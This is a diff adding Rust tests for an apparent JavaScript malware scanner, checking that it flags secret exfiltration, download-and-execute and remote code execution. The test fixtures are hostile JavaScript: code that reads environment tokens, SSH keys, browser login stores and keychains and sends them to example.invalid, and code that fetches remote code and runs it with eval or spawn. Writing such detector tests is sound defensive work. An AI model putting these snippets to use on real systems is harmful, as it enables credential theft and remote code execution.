@@ -1050,6 +1050,34 @@ fn environment_secret_reaches_outbound_request() {
 }
 
 #[test]
+fn imported_secret_reader_reaches_outbound_request_across_modules() {
+    let root = temporary_directory("cross-module-secret-exfil");
+    fs::write(
+        root.join("main.js"),
+        b"import { token } from './secrets.js'; fetch('https://example.invalid/collect', { method: 'POST', body: token() });",
+    )
+    .unwrap();
+    fs::write(
+        root.join("secrets.js"),
+        b"export function token() { return process.env.API_TOKEN; }",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+        .unwrap_or_else(|| panic!("missing exfiltration finding: {}", report["findings"]));
+    assert_eq!(finding["severity"], "critical");
+    assert!(finding["evidence"].to_string().contains("secrets.js"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn home_relative_credential_file_reaches_outbound_request() {
     let root = temporary_directory("home-secret");
     fs::write(root.join("main.js"), b"const fs = require('fs'); const path = require('path'); const os = require('os'); const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa')); fetch('https://example.invalid/collect', { method: 'POST', body: key });").unwrap();
@@ -1064,6 +1092,110 @@ fn home_relative_credential_file_reaches_outbound_request() {
             .iter()
             .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
     );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn browser_and_password_store_paths_reach_outbound_request() {
+    let root = temporary_directory("browser-store-exfil");
+    let paths = [
+        r"C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\default\logins.json",
+        r"C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\default\key4.db",
+        r"C:\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Local State",
+        "/Users/user/Library/Keychains/login.keychain-db",
+        "/Users/user/.password-store/login.gpg",
+        "/Users/user/AppData/Local/Temp/settings.json",
+    ];
+    let source = paths
+        .iter()
+        .enumerate()
+        .map(|(index, path)| {
+            format!(
+                "const file{index} = fs.readFileSync({path:?}); fetch('https://example.invalid/collect', {{ body: file{index} }});"
+            )
+        })
+        .collect::<Vec<_>>()
+        .join("\n");
+    fs::write(
+        root.join("main.js"),
+        format!("const fs = require('fs');\n{source}"),
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+            .count(),
+        5
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn browser_send_beacon_exfiltration_is_detected_without_tainting_its_return() {
+    let root = temporary_directory("send-beacon-exfil");
+    fs::write(
+        root.join("main.js"),
+        b"navigator.sendBeacon('/collect', process.env.TOKEN);\nglobalThis.navigator.sendBeacon('/collect', process.env.HOME);\nwindow.navigator.sendBeacon('/collect', process.env.SECRET);\nconst result = navigator.sendBeacon('/metrics', 'ok'); eval(result);",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = report["findings"].as_array().unwrap();
+    assert_eq!(
+        findings
+            .iter()
+            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+            .count(),
+        3
+    );
+    assert!(
+        findings
+            .iter()
+            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn imported_download_helper_reaches_process_execution_across_modules() {
+    let root = temporary_directory("cross-module-download-execute");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node main.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("main.js"),
+        b"import { download } from './payload.js'; const cp = require('node:child_process'); async function start() { await download('/tmp/helper'); cp.spawn('/tmp/helper'); } start();",
+    )
+    .unwrap();
+    fs::write(
+        root.join("payload.js"),
+        b"import { writeFile } from 'node:fs/promises'; export async function download(path) { const response = await fetch('https://example.invalid/helper'); await writeFile(path, await response.text()); }",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let finding = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
+        .unwrap_or_else(|| panic!("missing download-execute finding: {}", report["findings"]));
+    assert_eq!(finding["severity"], "critical");
+    assert!(finding["evidence"].to_string().contains("payload.js"));
+    assert!(finding["evidence"].to_string().contains("spawn"));
     fs::remove_dir_all(root).unwrap();
 }
 
@@ -1608,6 +1740,33 @@ fn registry_startup_command_is_reported_but_quoted_words_are_not() {
             .count(),
         1
     );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn class_and_exported_object_methods_preserve_remote_data() {
+    let root = temporary_directory("method-flow");
+    fs::write(
+        root.join("main.js"),
+        b"import { remote, Loader } from './api.js';\nnew Loader().run();\nasync function start() { remote.execute(await remote.get()); }\nstart();",
+    )
+    .unwrap();
+    fs::write(
+        root.join("api.js"),
+        b"export const remote = { async get() { return (await fetch('https://example.invalid/object')).text(); }, execute(code) { eval(code); } };\nexport class Loader { async run() { const response = await fetch('https://example.invalid/class'); eval(await response.text()); } }",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = report["findings"].as_array().unwrap();
+    let chains: Vec<_> = findings
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect();
+    assert_eq!(chains.len(), 2, "{}", report["findings"]);
+    assert!(chains.iter().all(|finding| finding["file"] == "api.js"));
     fs::remove_dir_all(root).unwrap();
 }
 
